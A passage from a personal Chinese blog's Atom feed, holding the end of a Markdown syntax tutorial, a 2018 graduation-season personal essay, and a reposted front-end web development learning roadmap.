class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\```javascript</span><br><span class="line">var num = 0;</span><br><span class="line">for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    num+=i;</span><br><span class="line">&#125;</span><br><span class="line">\```console.log(num);</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    num+=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(num);</span><br></pre></td></tr></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>Markdown中支持两种列表：无序列表和有序列表。</p><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>无序列表有三种语法,可使用 <code>*</code> 、<code>+</code> 、 <code>-</code>作为列表标记。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*   Red</span><br><span class="line">*   Green</span><br><span class="line">*   Blue</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+   Red</span><br><span class="line">+   Green</span><br><span class="line">+   Blue</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-   Red</span><br><span class="line">-   Green</span><br><span class="line">-   Blue</span><br></pre></td></tr></table></figure><p>效果：</p><ul><li>Red</li><li>Green</li><li>Blue</li></ul><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>在列表标记上使用的数字并不会影响输出的 HTML 结果，即可以让 Markdown 文件的列表数字和输出的结果相同，也可以完全不用在意数字的正确性。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.  Bird</span><br><span class="line">2.  McHale</span><br><span class="line">3.  Parish</span><br></pre></td></tr></table></figure><p>效果：</p><ol><li>Bird</li><li>McHale</li><li>Parish</li></ol><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* * *</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">- - -</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure><p>效果：</p><hr><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>Markdown 支持两种形式的链接语法： 行内式和参考式两种形式。不管是哪一种，链接文字都是用 [方括号] 来标记。</p><h3 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h3><p>要建立一个行内式的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[an example](http://example.com/&quot;Title&quot;)&#123;:</span><br></pre></td></tr></table></figure><p>效果：<br><a href="http://example.com/&quot;Title&quot;" target="_blank" rel="noopener">an example</a></p><h3 id="参考式"><a href="#参考式" class="headerlink" title="参考式"></a>参考式</h3><p>该链接必须带 <code>http://</code> ，否则会被解析成本地路径，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[an example][id]</span><br><span class="line">[id]: http://example.com/</span><br></pre></td></tr></table></figure><p>效果：<br><a href="http://example.com/" target="_blank" rel="noopener">an example</a></p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>Markdown 使用一种和链接很相似的语法来标记图片，和链接的主要区别在于在最开头需要标记 <code>!</code> 。同样分为行内式和参考式。</p><h3 id="行内式-1"><a href="#行内式-1" class="headerlink" title="行内式"></a>行内式</h3><p>方括号中用来放图片无法正常显示时的替代文字，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![Alt text](../assets/blogImg/avatar.png)</span><br></pre></td></tr></table></figure><h3 id="参考式-1"><a href="#参考式-1" class="headerlink" title="参考式"></a>参考式</h3><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![Alt text][01]</span><br><span class="line">[01]: ../assets/blogImg/avatar.png</span><br></pre></td></tr></table></figure><p>效果：<br><img src="../assets/blogImg/2018-3-31.jpg" alt="Alt text"></p><h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h2><p>注意要空开一行书写。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- [x] 选项一</span><br><span class="line">- [ ] 选项二  </span><br><span class="line">- [ ]  [选项3]</span><br></pre></td></tr></table></figure><p>效果：</p><ul><li style="list-style: none"><input type="checkbox" checked> 选项一</li><li style="list-style: none"><input type="checkbox"> 选项二  </li><li style="list-style: none"><input type="checkbox"> 选项三</li></ul><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p><code>:</code> 代表对齐方式 , <code>:</code> 与 <code>|</code> 之间不要有空格，否则对齐会有些不兼容。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|    a    |       b       |      c     |</span><br><span class="line">|:-------:|:------------- | ----------:|</span><br><span class="line">|   居中  |     左对齐    |   右对齐   |</span><br><span class="line">|=========|===============|============|</span><br></pre></td></tr></table></figure><p>效果：</p><table><thead><tr><th style="text-align:center">a</th><th style="text-align:left">b</th><th style="text-align:right">c</th></tr></thead><tbody><tr><td style="text-align:center">居中</td><td style="text-align:left">左对齐</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:center">=========</td><td style="text-align:left">===============</td><td style="text-align:right">============</td></tr></tbody></table><p>简约写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a | b | c  </span><br><span class="line">:-:|:- |-:</span><br><span class="line">    居中    |     左对齐      |   右对齐    </span><br><span class="line">============|=================|=============</span><br></pre></td></tr></table></figure><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><table><thead><tr><th style="text-align:center">描述</th><th style="text-align:center">效果</th><th style="text-align:center">代码</th></tr></thead><tbody><tr><td style="text-align:center">斜体</td><td style="text-align:center"><em>斜体</em></td><td style="text-align:center"><code>*斜体*</code></td></tr><tr><td style="text-align:center">斜体</td><td style="text-align:center"><em>斜体</em></td><td style="text-align:center"><code>_斜体_</code></td></tr><tr><td style="text-align:center">加粗</td><td style="text-align:center"><strong>加粗</strong></td><td style="text-align:center"><code>**加粗**</code></td></tr><tr><td style="text-align:center">加粗+斜体</td><td style="text-align:center"><strong><em>加粗+斜体</em></strong></td><td style="text-align:center"><code>***加粗+斜体***</code></td></tr><tr><td style="text-align:center">加粗+斜体</td><td style="text-align:center"><strong><em>加粗+斜体</em></strong></td><td style="text-align:center"><code>**_加粗+斜体_**</code></td></tr><tr><td style="text-align:center">删除线</td><td style="text-align:center"><del>删除线</del></td><td style="text-align:center"><code>~~删除线~~</code></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;标题&quot;&gt;&lt;a href=&quot;#标题&quot; class=&quot;headerlink&quot; title=&quot;标题&quot;&gt;&lt;/a&gt;标题&lt;/h2&gt;&lt;p&gt;在Markdown中，标题一共分为六级，只需在文字前加上 &lt;code&gt;#&lt;/code&gt; 即可，这类标题也可以选择闭合，闭合只是为了美观，由行首的井字符数量决定标题的阶数。代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# h1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;## h2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;### h3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#### h4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;##### h5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;###### h6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;分级标题&quot;&gt;&lt;a href=&quot;#分级标题&quot; class=&quot;headerlink&quot; title=&quot;分级标题&quot;&gt;&lt;/a&gt;分级标题&lt;/h2&gt;&lt;p&gt;与标题作用类似，&lt;code&gt;=&lt;/code&gt; 和 &lt;code&gt;-&lt;/code&gt; 最少可只写一个，兼容性一般。代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;一级标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;============&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;二级标题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;------------&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="语法" scheme="http://dangoying.ink/categories/%E8%AF%AD%E6%B3%95/"/>
    
    
      <category term="Markdown" scheme="http://dangoying.ink/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>人生这本书翻开新的一章</title>
    <link href="http://dangoying.ink/%E4%BA%BA%E7%94%9F%E8%BF%99%E6%9C%AC%E4%B9%A6%E7%BF%BB%E5%BC%80%E6%96%B0%E7%9A%84%E4%B8%80%E7%AB%A0.html"/>
    <id>http://dangoying.ink/人生这本书翻开新的一章.html</id>
    <published>2018-03-30T12:07:12.000Z</published>
    <updated>2018-03-30T15:02:26.615Z</updated>
    
    <content type="html"><![CDATA[<p><img src="./assets/blogImg/2018-3-30.jpg" alt=""><br><a id="more"></a><br>3月的尾巴，距离大学毕业还剩2个月左右的时间，昨晚和室友卧谈，聊起了在这个时间点，每个站在人生岔路口迷茫的我们。<br>最近考研、考公的都出了结果，漫长的备考过程，本期望着盼来好消息的两个室友却不得不面对与自己第一志愿失之交臂，在调剂亦或是就业中做出选择，当其他得到录取通知的同学开始整日整日放纵欢腾的时候，她们脸上是淡淡的笑，眼里却也有着对未来的迷茫。在和我一起逛过几次招聘会后，昨天其中一个室友说，她决定调剂，去一个离我们很远的地方继续她的学习生涯，说这话时，我能感觉到她隐隐的无奈，但也只能淡淡祝她好运，话题的最后，我仿佛听到自己内心一个声音问道：“这就是你当初不选择考研而是直接工作的原因吗？”<br>不是。去年的这个时候，当我做出这个决定周围经常会有人问“你成绩那么好，大学那么努力，为什么不考虑考研深造呢”，我不考研并不是因为我害怕最后会失败，而是我清楚的知道自己想要什么，即使学生时代那么让人留恋，但明确知道自己想做一名优秀程序媛的我，需要更多的是实践动手能力，在公司中不断参与项目的开发能更快提升我的能力，虽然一个更高的学历可能会为我在就业上扫除很多障碍，就不会像现在的我这样有些无助。不愿离开学生时代，倒不如说是不愿离开象牙塔。但是不管是哪一个选择都已经是过去式，与其缅怀过去不如立足当下。<br>现在的不顺利，是之前的准备不充分，机会是给有准备的人的这句话，不是失败者拿来自我安慰，所幸学习这件事，不管何时开始都不算晚，为了让自己更优秀，让自己成为HR眼中合适的人，让自己离自己的目标越来越接近，就从这篇博文开始，找回那个热血的自己。嘴上立志轻松容易，但学习却是持之以恒，愿自己初心莫负。</p><p>——<em>2018年3月30日于杭州师范大学</em></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;./assets/blogImg/2018-3-30.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://dangoying.ink/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="http://dangoying.ink/tags/%E9%9A%8F%E7%AC%94/"/>
    
      <category term="心情" scheme="http://dangoying.ink/tags/%E5%BF%83%E6%83%85/"/>
    
      <category term="生活" scheme="http://dangoying.ink/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>前端学习路线</title>
    <link href="http://dangoying.ink/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF.html"/>
    <id>http://dangoying.ink/前端学习路线.html</id>
    <published>2018-03-28T11:39:59.000Z</published>
    <updated>2018-03-30T12:31:47.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一阶段："><a href="#第一阶段：" class="headerlink" title="第一阶段："></a>第一阶段：</h2><ul><li>HTML+CSS：<br>HTML进阶、CSS进阶、div+css布局、HTML+css整站开发。</li><li>JavaScript基础：<br>Js基础教程、js内置对象常用方法、常见DOM树操作大全、ECMAscript、DOM、BOM、定时器和焦点图。</li><li>JS基本特效：<br>常见特效、例如：tab、导航、整页滚动、轮播图、JS制作幻灯片、弹出层、手风琴菜单、瀑布流布局、滚动事件、滚差视图。<a id="more"></a></li><li>JS高级特征：<br>正则表达式、排序算法、递归算法、闭包、函数节流、作用域链、基于距离运动框架、面向对象基础。</li><li>JQuery：<br>悬着器、DOM操作、特效和动画、方法链、拖拽、变形、JQueryUI组件基本使用。</li></ul><h2 id="第二阶段：HTML5和移动Web开发"><a href="#第二阶段：HTML5和移动Web开发" class="headerlink" title="第二阶段：HTML5和移动Web开发"></a>第二阶段：HTML5和移动Web开发</h2><ul><li>HTML5：<br>HTML5新语义标签、HTML5表单、音频和视频、离线和本地存储、SVG、Web Socket、Canvas。</li><li>CSS3：<br>CSS3新选择器、伪元素、脸色表示法、边框、阴影、background系列属性改变、Transition、动画、景深和深透、3D效果制作、Velocity.js框架、元素进场、出场策略、炫酷CSS3网页制作。</li><li>Bootstrap:<br>响应式概念、媒体查询、响应式网站制作、删格系统、删格系统原理、Bootstrap常用模板、LESS和SASS。</li><li>移动Web开发：<br>跨终端WEB和主流设备简介、视口、流式布局、弹性盒子、rem、移动终端JavaScript事件、手机中常见JS效果制作、Zepto.js、手机聚划算页面、手机滚屏。</li></ul><h2 id="第三阶段：HTTP服务和AJAX编程"><a href="#第三阶段：HTTP服务和AJAX编程" class="headerlink" title="第三阶段：HTTP服务和AJAX编程"></a>第三阶段：HTTP服务和AJAX编程</h2><ul><li>WEB服务器基础：<br>服务器基础知识、Apache服务器和其他WEB服务器介绍、Apache服务器搭建、HTTP介绍。</li><li>PHP基础：<br>PHP基础语法、使用PHP处理简单的GET或者POST请求。</li><li>AJAX上篇：<br>Ajax简介和异步的概念、Ajax框架的封装、XMLHttpRequest对象详细介绍方法、兼容性处理方法、Ajax框架的封装、Ajax中缓存问题、XML介绍和使用。</li><li>AJAX下篇：<br>JSON和JSON解析、数据绑定和模板技术、JSONP、跨域技术、图片预读取和lazy-load技术、JQuery框架中的AjaxAPI、使用Ajax实现爆布流案例额。</li></ul><h2 id="第四阶段：HTTP服务和AJAX编程"><a href="#第四阶段：HTTP服务和AJAX编程" class="headerlink" title="第四阶段：HTTP服务和AJAX编程"></a>第四阶段：HTTP服务和AJAX编程</h2><ul><li>面向对象终极篇：<br>从内存角度到理解JS面向对象、基本类型、复杂类型、原型链、ES6中的面向对象、属性读写权限、设置器、访问器。</li><li>面向对象三大特征：<br>继承性、多态性、封装性、接口。</li><li>设计模式：<br>面向对象编程思维、单例模式、工厂模式、策略模式、观察者模式、模板方法模式、代理模式、装饰者模式、适配器模式、面向切面编程。</li></ul><h2 id="第五阶段：封装一个属于自己的框架"><a href="#第五阶段：封装一个属于自己的框架" class="headerlink" title="第五阶段：封装一个属于自己的框架"></a>第五阶段：封装一个属于自己的框架</h2><ul><li>框架封装基础：<br>事件流、冒泡、捕获、事件对象、事件框架、选择框架。</li><li>框架封装中级：<br>运动原理、单物体运动框架、多物体运动框架、运动框架面向对象封装。</li><li>框架封装高级和补充：<br>JQuery框架雏形、可扩展性、模块化、封装属于传智自己的框架。</li></ul><h2 id="第六阶段：模块化组件开发"><a href="#第六阶段：模块化组件开发" class="headerlink" title="第六阶段：模块化组件开发"></a>第六阶段：模块化组件开发</h2><ul><li>面向组件编程：<br>面向组件编程的方式、面向组件编程的实现原理、面向组件编程实战、基于组件化思想开发网站应用程序。</li><li>面向模块编程：<br>AMD设计规范、CMD设计规范、RequireJS，LoadJS、淘宝的SeaJS。</li></ul><h2 id="第七阶段：主流的流行框架"><a href="#第七阶段：主流的流行框架" class="headerlink" title="第七阶段：主流的流行框架"></a>第七阶段：主流的流行框架</h2><ul><li>Web开发工作流：<br>GIT/SVN、Yeoman脚手架、NPM/Bower依赖管理工具、Grunt/Gulp/Webpack。</li><li>MVC/MVVM/MVW框架：<br>Angular.js、Backbone.js、Knockout/Ember。</li><li>常用库：<br>React.js、Vue.js、Zepto.js。</li></ul><h2 id="第八阶段：HTML5原生移动应用开发"><a href="#第八阶段：HTML5原生移动应用开发" class="headerlink" title="第八阶段：HTML5原生移动应用开发"></a>第八阶段：HTML5原生移动应用开发</h2><ul><li>Cordova：<br>WebApp/NativeApp/HybirdApp简介、Cordova简介、与PhoneGap之间的关系、开发环境搭建、Cordova实战（创建项目，配置，编译，调试，部署发布）。</li><li>Ionic：<br>Ionic简介和同类对比、模板项目解析、常见组件及使用、结合Angular构建APP、常见效果（下拉刷新，上拉加载，侧滑导航，选项卡）。</li><li>React Native：<br>React Native简介、React Native环境配置、创建项目，配置，编译，调试，部署发布、原生模块和UI组件、原生常用API。</li><li>HTML5+：<br>HTML5+中国产业联盟、HTML5 Plus Runtime环境、HBuilder开发工具、MUI框架、H5+开发和部署。</li></ul><h2 id="第九阶段：Node-js全栈开发"><a href="#第九阶段：Node-js全栈开发" class="headerlink" title="第九阶段：Node.js全栈开发"></a>第九阶段：Node.js全栈开发</h2><ul><li>快速入门：<br>Node.js发展、生态圈、Io.js、Linux/Windows/OS X环境配置、REPL环境和控制台程序、异步编程，非阻塞I/O、模块概念，模块管理工具、开发流程，调试，测试。</li><li>核心模块和对象：<br>全局对象global，process，console，util、事件驱动，事件发射器、加密解密，路径操作，序列化和反序列化、文件流操作、HTTP服务端与客户端、Socket.IO。</li><li>Web开发基础：<br>HTTP协议，请求响应处理过程、关系型数据库操作和数据访问、非关系型数据库操作和数据访问、原生的Node.js开发Web应用程序、Web开发工作流、Node.js开发Blog案例。</li><li>快速开发框架：<br>Express简介+MVC简介、Express常用API、Express路由模块、Jade/Ejs模板引擎、使用Express重构Blog案例、Koa等其他常见MVC框架。</li><li>Node.js开发电子商务实战：<br>需求与设计、账户模块注册登录、会员中心模块、前台展示模块、购物车，订单结算、在线客服即时通讯模块。</li></ul><p>转自:<a href="https://blog.csdn.net/u011047006/article/details/52597178" target="_blank" rel="noopener">https://blog.csdn.net/u011047006/article/details/52597178</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;第一阶段：&quot;&gt;&lt;a href=&quot;#第一阶段：&quot; class=&quot;headerlink&quot; title=&quot;第一阶段：&quot;&gt;&lt;/a&gt;第一阶段：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;HTML+CSS：&lt;br&gt;HTML进阶、CSS进阶、div+css布局、HTML+css整站开发。&lt;/li&gt;
&lt;li&gt;JavaScript基础：&lt;br&gt;Js基础教程、js内置对象常用方法、常见DOM树操作大全、ECMAscript、DOM、BOM、定时器和焦点图。&lt;/li&gt;
&lt;li&gt;JS基本特效：&lt;br&gt;常见特效、例如：tab、导航、整页滚动、轮播图、JS制作幻灯片、弹出层、手风琴菜单、瀑布流布局、滚动事件、滚差视图。
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
</feed>
